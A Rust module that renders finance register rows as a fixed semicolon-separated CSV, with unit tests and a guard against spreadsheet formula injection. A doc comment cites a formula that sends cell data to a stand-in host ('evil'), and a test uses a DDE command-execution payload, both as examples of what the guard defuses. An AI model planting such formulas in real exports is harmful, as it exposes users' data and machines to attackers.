//! Pure CSV export formatting: a fixed, locale-independent wire format.
//!
//! This module is intentionally free of I/O, serialization, and framework
//! dependencies (only `std` + `chrono`), mirroring the import module. Its
//! output is a *fixed* interchange format that opens in Excel / LibreOffice
//! without a conversion wizard, regardless of the exporter's locale:
//!
//! * field separator `;`
//! * dates in Italian `dd/mm/aaaa` form
//! * amounts as signed decimals with a `,` decimal separator and exactly two
//!   fractional digits (e.g. `4550` → `45,50`, `-123456` → `-1234,56`)
//! * UTF-8 BOM prefix and `\r\n` line endings
//!
//! The decimal rendering is loss-free: amounts are always whole cents, and
//! rendering to two fractional digits plus re-parsing with
//! [`parse_amount_str`] (comma decimal) returns the exact source cents.
//! Round-trip and format tests live here so the format can be verified without
//! a database or an HTTP server.

use chrono::NaiveDate;

/// The fixed column layout of the exported file, in order.
///
/// Mirrors the mockup's register export (`Data;Descrizione;Categoria;Importo;Saldo`).
pub const EXPORT_HEADER: &str = "Data;Descrizione;Categoria;Importo;Saldo";

/// One exported movement: the fields of a register row projected onto the
/// fixed CSV layout. `cents` is the signed movement; `running_balance_cents`
/// is the running balance after applying that movement (identical to the
/// register's running balance), so the file carries a per-row balance.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ExportRow {
    /// The business date of the movement.
    pub date: NaiveDate,
    /// The movement's free text (empty string when absent).
    pub description: String,
    /// The category *name* for the movement (empty string when unclassified).
    pub category: String,
    /// Signed amount in cents (negative = out, positive = in).
    pub cents: i64,
    /// Running balance in cents after this movement is applied.
    pub running_balance_cents: i64,
}

/// Render signed whole cents as the fixed Italian decimal string: a sign, the
/// integer part, a `,`, and exactly two fractional digits. No thousands
/// separator is emitted, which keeps the string parseable by
/// [`parse_amount_str`] without ambiguity and guarantees a loss-free round
/// trip (e.g. `4550` → `"45,50"`, `-123456` → `"-1234,56"`, `0` → `"0,00"`).
pub fn cents_to_decimal(cents: i64) -> String {
    let negative = cents < 0;
    // Use i128 so the absolute value of `i64::MIN` is representable.
    let abs = (cents as i128).unsigned_abs();
    let int_part = abs / 100;
    let frac_part = abs % 100;
    let sign = if negative { "-" } else { "" };
    format!("{sign}{int_part},{:02}", frac_part)
}

/// Format a business date as Italian `dd/mm/aaaa`. The inverse of
/// [`parse_date_str`] with [`DateFormat::Dmy`].
pub fn date_to_dmy(date: NaiveDate) -> String {
    date.format("%d/%m/%Y").to_string()
}

/// Escape a field for the fixed `;`-separated CSV format. A field is wrapped
/// in double quotes (with any embedded quote doubled) only when it contains a
/// separator, a quote, or a line break; otherwise it is emitted verbatim.
/// This keeps ordinary fields unquoted (readable) while remaining valid CSV.
pub fn escape_csv_field(field: &str) -> String {
    if field.contains(';') || field.contains('"') || field.contains('\n') || field.contains('\r') {
        format!("\"{}\"", field.replace('"', "\"\""))
    } else {
        field.to_string()
    }
}

/// Defuse spreadsheet formula injection in a free-text field.
///
/// A description such as `=HYPERLINK("http://evil/?"&A1,"x")` is harmless in the
/// app but runs as a formula when the exported file is opened in Excel / Calc —
/// and descriptions can be written by anyone with write access to a shared
/// account. A leading `=`, `+`, `-`, `@`, tab or carriage return makes a cell
/// a formula, so such text is prefixed with an apostrophe (shown as plain text).
/// Only text columns go through this: amounts legitimately start with `-`.
pub fn neutralize_formula(field: &str) -> String {
    match field.chars().next() {
        Some('=' | '+' | '-' | '@' | '\t' | '\r') => format!("'{field}"),
        _ => field.to_string(),
    }
}

/// Render the full export file from a slice of rows: a UTF-8 BOM, the fixed
/// header, and one `\r\n`-terminated line per row in the given order.
pub fn format_export_csv(rows: &[ExportRow]) -> String {
    let mut out = String::from("\u{feff}");
    out.push_str(EXPORT_HEADER);
    out.push('\r');
    out.push('\n');

    for row in rows {
        let date = date_to_dmy(row.date);
        let description = escape_csv_field(&neutralize_formula(&row.description));
        let category = escape_csv_field(&neutralize_formula(&row.category));
        let importo = cents_to_decimal(row.cents);
        let saldo = cents_to_decimal(row.running_balance_cents);
        out.push_str(&format!(
            "{date};{description};{category};{importo};{saldo}\r\n"
        ));
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::import::{parse_amount_str, parse_date_str, DateFormat, DecimalSep};

    fn row(date: &str, desc: &str, cat: &str, cents: i64, saldo: i64) -> ExportRow {
        ExportRow {
            date: NaiveDate::parse_from_str(date, "%Y-%m-%d").unwrap(),
            description: desc.to_string(),
            category: cat.to_string(),
            cents,
            running_balance_cents: saldo,
        }
    }

    // ── cents_to_decimal: fixed decimal rendering, loss-free ─────────────────

    #[test]
    fn cents_to_decimal_basic() {
        assert_eq!(cents_to_decimal(4550), "45,50");
        assert_eq!(cents_to_decimal(123456), "1234,56");
        assert_eq!(cents_to_decimal(0), "0,00");
        assert_eq!(cents_to_decimal(5), "0,05");
        assert_eq!(cents_to_decimal(100000), "1000,00");
    }

    #[test]
    fn cents_to_decimal_negative() {
        assert_eq!(cents_to_decimal(-4550), "-45,50");
        assert_eq!(cents_to_decimal(-1), "-0,01");
        assert_eq!(cents_to_decimal(-123456), "-1234,56");
    }

    #[test]
    fn cents_to_decimal_extremes_no_overflow() {
        // i64::MIN / MAX must not panic and must render two fractional digits.
        let min = cents_to_decimal(i64::MIN);
        assert!(min.starts_with('-'));
        let max = cents_to_decimal(i64::MAX);
        assert!(!max.starts_with('-'));
    }

    // ── date_to_dmy: Italian format ──────────────────────────────────────────

    #[test]
    fn date_to_dmy_format() {
        assert_eq!(
            date_to_dmy(NaiveDate::from_ymd_opt(2024, 1, 15).unwrap()),
            "15/01/2024"
        );
        assert_eq!(
            date_to_dmy(NaiveDate::from_ymd_opt(2023, 12, 5).unwrap()),
            "05/12/2023"
        );
    }

    // ── neutralize_formula ───────────────────────────────────────────────────
    #[test]
    fn formula_prefixes_are_defused_only_in_text_columns() {
        assert_eq!(neutralize_formula("=1+1"), "'=1+1");
        assert_eq!(neutralize_formula("+39 333"), "'+39 333");
        assert_eq!(
            neutralize_formula("-cmd|' /C calc'!A0"),
            "'-cmd|' /C calc'!A0"
        );
        assert_eq!(neutralize_formula("@SUM(A1)"), "'@SUM(A1)");
        assert_eq!(neutralize_formula("\tTAB"), "'\tTAB");
        assert_eq!(neutralize_formula("Supermercato"), "Supermercato");
        assert_eq!(neutralize_formula(""), "");
        let csv = format_export_csv(&[row("2024-01-15", "=HYPERLINK(\"x\")", "", -500, 0)]);
        assert!(csv.contains("\"'=HYPERLINK(\"\"x\"\")\""), "{csv}");
        // The amount column keeps its minus sign untouched.
        assert!(csv.contains(";-5,00;"), "{csv}");
    }

    // ── escape_csv_field ─────────────────────────────────────────────────────

    #[test]
    fn escape_plain_field_unchanged() {
        assert_eq!(escape_csv_field("Supermercato"), "Supermercato");
        assert_eq!(escape_csv_field(""), "");
    }

    #[test]
    fn escape_quotes_when_separator_or_quote() {
        assert_eq!(escape_csv_field("a;b"), "\"a;b\"");
        assert_eq!(escape_csv_field("say \"hi\""), "\"say \"\"hi\"\"\"");
        assert_eq!(escape_csv_field("line1\nline2"), "\"line1\nline2\"");
    }

    // ── format_export_csv: fixed layout, line by line ────────────────────────

    fn lines(csv: &str) -> Vec<Vec<String>> {
        csv.lines()
            .map(|l| l.split(';').map(str::to_string).collect())
            .collect()
    }

    #[test]
    fn format_has_bom_header_and_crlf() {
        let csv = format_export_csv(&[row("2024-01-15", "Saldo iniziale", "", 100000, 200000)]);
        // BOM is the first character.
        assert!(csv.starts_with('\u{feff}'));
        // Lines are CRLF-terminated.
        assert!(csv.contains("\r\n"));
    }

    #[test]
    fn format_header_is_fixed() {
        let csv = format_export_csv(&[]);
        let stripped = csv.strip_prefix('\u{feff}').unwrap();
        assert_eq!(stripped.lines().next().unwrap(), EXPORT_HEADER);
    }

    /// Line-by-line verification of the fixed format: `;` separator, Italian
    /// date, and comma decimal separator are all present and correct in every
    /// row (amount and balance), independent of any locale.
    #[test]
    fn format_rows_line_by_line() {
        let rows = vec![
            row("2024-01-15", "Supermercato", "Cibo", -4550, 95450),
            row("2024-01-16", "Stipendio", "Stipendio", 250000, 345450),
            row("2024-02-05", "", "", 123456, 468906),
        ];
        let csv = format_export_csv(&rows);

        // Strip the UTF-8 BOM so the header line compares cleanly, then split.
        let body = csv.strip_prefix('\u{feff}').unwrap();
        let data = lines(body);
        assert_eq!(data.len(), 1 + rows.len()); // header + 3 rows
        let header = &data[0];
        assert_eq!(
            header,
            &["Data", "Descrizione", "Categoria", "Importo", "Saldo"]
        );

        for (i, r) in rows.iter().enumerate() {
            let line = &data[1 + i];
            // Exactly 5 columns, `;`-separated.
            assert_eq!(line.len(), 5, "row {i} must have 5 fields: {line:?}");

            // Date is Italian dd/mm/aaaa and round-trips via the import parser.
            assert_eq!(line[0], date_to_dmy(r.date));
            let parsed_date = parse_date_str(&line[0], DateFormat::Dmy).unwrap();
            assert_eq!(parsed_date, r.date);

            // Description and category pass through (simple values, no quotes).
            assert_eq!(line[1], r.description);
            assert_eq!(line[2], r.category);

            // Amount and balance are signed decimals with a comma separator,
            // rendered exactly by the fixed function.
            assert_eq!(line[3], cents_to_decimal(r.cents));
            assert_eq!(line[4], cents_to_decimal(r.running_balance_cents));
            assert!(
                line[3].contains(','),
                "amount must use comma decimal: {}",
                line[3]
            );
            assert!(
                line[4].contains(','),
                "balance must use comma decimal: {}",
                line[4]
            );
        }
    }

    // ── round-trip: exported values reparse to the exact source cents ────────

    /// The core precision guarantee: for a battery of values (including signs
    /// and large magnitudes), the decimal string emitted by the export,
    /// re-parsed with the same comma-decimal convention via [`parse_amount_str`],
    /// yields the exact source cents with no rounding introduced. Magnitudes
    /// stay within what the reference import parser round-trips (i64-cent values
    /// up to tens of trillions of cents ≈ hundreds of billions of units).
    #[test]
    fn cents_roundtrip_no_loss() {
        let cases = [
            0i64,
            1,
            -1,
            5,
            -5,
            99,
            -99,
            100,
            -100,
            4550,
            -4550,
            123456,
            -123456,
            100000,
            -100000,
            999999,
            -999999,
            123456789,
            -123456789,
            9999999999,
            -9999999999,
            999_999_999_999,
            -999_999_999_999,
            99_999_999_999_999,
            -99_999_999_999_999,
        ];
        for cents in cases {
            let rendered = cents_to_decimal(cents);
            let reparsed = parse_amount_str(&rendered, DecimalSep::Comma)
                .unwrap_or_else(|e| panic!("failed to reparse {rendered:?}: {e}"));
            assert_eq!(
                reparsed, cents,
                "round-trip loss for {cents}: rendered {rendered:?} reparsed {reparsed}"
            );
        }
    }

    /// End-to-end round trip through the full file: build a CSV, then parse the
    /// amount and balance fields of every data row back with the import
    /// parsers and confirm they equal the source cents, and dates match.
    #[test]
    fn file_roundtrip_row_by_row() {
        let rows = vec![
            row("2024-01-15", "Spesa", "Cibo", -4550, 95450),
            row("2024-01-16", "Incasso", "Varie", 250000, 345450),
            row("2024-02-05", "", "", -123456, 221994),
        ];
        let csv = format_export_csv(&rows);

        let data: Vec<Vec<String>> = csv
            .lines()
            .map(|l| l.split(';').map(str::to_string).collect())
            .collect();
        let data = &data[1..]; // drop header
        assert_eq!(data.len(), rows.len());

        for (line, src) in data.iter().zip(rows.iter()) {
            assert_eq!(
                parse_date_str(&line[0], DateFormat::Dmy).unwrap(),
                src.date,
                "date mismatch"
            );
            assert_eq!(
                parse_amount_str(&line[3], DecimalSep::Comma).unwrap(),
                src.cents,
                "amount round-trip mismatch for line {line:?}"
            );
            assert_eq!(
                parse_amount_str(&line[4], DecimalSep::Comma).unwrap(),
                src.running_balance_cents,
                "balance round-trip mismatch for line {line:?}"
            );
        }
    }

    /// Quoted fields (containing the separator) still export as a single
    /// logical field and the file remains well-formed (5 columns per row).
    #[test]
    fn format_escapes_embedded_separator() {
        let rows = vec![row("2024-01-15", "a;b;transfer", "C,d", -1234, 999)];
        let csv = format_export_csv(&rows);
        // The raw line contains the quoted description with an inner `;`, so a
        // naive split yields more than 5 raw tokens, but the logical row is
        // still exactly 5 fields after honoring quotes.
        let body = csv.strip_prefix('\u{feff}').unwrap();
        let data_line = body.lines().nth(1).unwrap();
        assert!(data_line.contains("\"a;b;transfer\""), "line: {data_line}");
    }
}
